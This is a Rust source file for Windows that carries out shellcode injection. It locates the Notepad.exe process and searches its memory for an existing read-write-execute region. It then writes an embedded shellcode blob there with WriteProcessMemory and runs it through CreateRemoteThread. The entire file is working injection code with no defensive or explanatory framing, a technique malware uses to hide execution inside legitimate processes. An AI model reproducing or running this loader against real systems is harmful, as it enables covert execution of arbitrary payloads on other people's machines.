use core::slice;
use std::{
    mem::{transmute, zeroed},
    os::raw::c_void,
    ptr::null_mut,
};

use windows_sys::{
    Wdk::System::SystemInformation::NtQuerySystemInformation,
    Win32::{
        Foundation::STATUS_INFO_LENGTH_MISMATCH,
        System::{
            Diagnostics::Debug::WriteProcessMemory,
            Memory::{
                MEM_COMMIT, MEMORY_BASIC_INFORMATION, PAGE_EXECUTE_READWRITE, VirtualQueryEx,
            },
            Threading::{
                CreateRemoteThread, OpenProcess, PROCESS_QUERY_INFORMATION, PROCESS_VM_OPERATION,
                PROCESS_VM_READ, PROCESS_VM_WRITE, WaitForSingleObject,
            },
            WindowsProgramming::SYSTEM_PROCESS_INFORMATION,
        },
    },
};

const SHELLCODE: &[u8] = include_bytes!("../shellcode.bin");

fn get_pid(proc_name: &str) -> u32 {
    let mut pid: u32 = 0;
    unsafe {
        let mut return_length: u32 = 0;
        let status = NtQuerySystemInformation(
            5, // SystemProcessInformation
            null_mut(),
            0,
            &mut return_length,
        );

        if status != STATUS_INFO_LENGTH_MISMATCH {
            println!("[-] Failed to query system information: {}", status);
            return pid;
        }

        let buff_size = return_length as usize;
        let mut buffer: Vec<u8> = vec![0; buff_size];

        let status = NtQuerySystemInformation(
            5, // SystemProcessInformation
            buffer.as_mut_ptr() as *mut _,
            buff_size as u32,
            &mut return_length,
        );

        if status != 0 {
            println!("[-] Failed to query system information: {}", status);
            return pid;
        }

        let mut proc_info = buffer.as_ptr() as *const SYSTEM_PROCESS_INFORMATION;
        loop {
            if !(*proc_info).ImageName.Buffer.is_null()
                && proc_name.eq_ignore_ascii_case(
                    &String::from_utf16_lossy(slice::from_raw_parts(
                        (*proc_info).ImageName.Buffer,
                        (*proc_info).ImageName.Length as usize / 2,
                    ))
                    .as_str(),
                )
            {
                pid = (*proc_info).UniqueProcessId as u32;
                break;
            }

            if (*proc_info).NextEntryOffset == 0 {
                break;
            }

            proc_info = (proc_info as *const u8).add((*proc_info).NextEntryOffset as usize)
                as *const SYSTEM_PROCESS_INFORMATION;
        }
    }

    pid
}

fn find_rwx(proc_handle: *mut c_void, min_len: usize) -> Option<*mut c_void> {
    unsafe {
        let mut mbi = zeroed::<MEMORY_BASIC_INFORMATION>();

        let mut addr = 0 as *mut c_void;

        loop {
            if VirtualQueryEx(
                proc_handle,
                addr,
                &mut mbi,
                size_of::<MEMORY_BASIC_INFORMATION>(),
            ) == 0
            {
                break;
            }

            if mbi.State == MEM_COMMIT
                && mbi.Protect == PAGE_EXECUTE_READWRITE
                && mbi.RegionSize >= min_len
            {
                println!(
                    "[+] Found RWX region at: {:016X?}, size: {}",
                    mbi.BaseAddress, mbi.RegionSize
                );
                return Some(mbi.BaseAddress);
            }

            addr = (mbi.BaseAddress as usize + mbi.RegionSize) as *mut c_void;
        }
    }
    None
}

fn main() {
    let proc_name = "Notepad.exe";
    let pid = get_pid(proc_name);

    if pid == 0 {
        println!("[-] {} not found", proc_name);
        return;
    }

    println!("[+] Found {}, PID: {}", proc_name, pid);

    let proc_handle = unsafe {
        OpenProcess(
            PROCESS_VM_OPERATION | PROCESS_QUERY_INFORMATION | PROCESS_VM_READ | PROCESS_VM_WRITE,
            0,
            pid,
        )
    };

    if proc_handle.is_null() {
        println!("[-] Failed to open process");
        return;
    }

    let rwx_region = match find_rwx(proc_handle, SHELLCODE.len()) {
        Some(rwx_region) => rwx_region,
        None => {
            println!("[-] No RWX region found in {}'s memory", proc_name);
            return;
        }
    };

    println!("[+] Writing shellcode to RWX region...");

    let mut bytes_written: usize = 0;
    unsafe {
        if WriteProcessMemory(
            proc_handle,
            rwx_region,
            SHELLCODE.as_ptr() as *const c_void,
            SHELLCODE.len(),
            &mut bytes_written,
        ) == 0
        {
            println!("[-] Failed to write process memory");
            return;
        }

        let mut thread_id = 0;
        let thread_handle = CreateRemoteThread(
            proc_handle,
            null_mut(),
            0,
            transmute(rwx_region),
            null_mut(),
            0,
            &mut thread_id,
        );

        if thread_handle.is_null() {
            println!("[-] Failed to create remote thread");
            return;
        }

        println!("[+] Thread created with ID: {}", thread_id);

        WaitForSingleObject(thread_handle, 0xFFFFFFFF);
    }
}
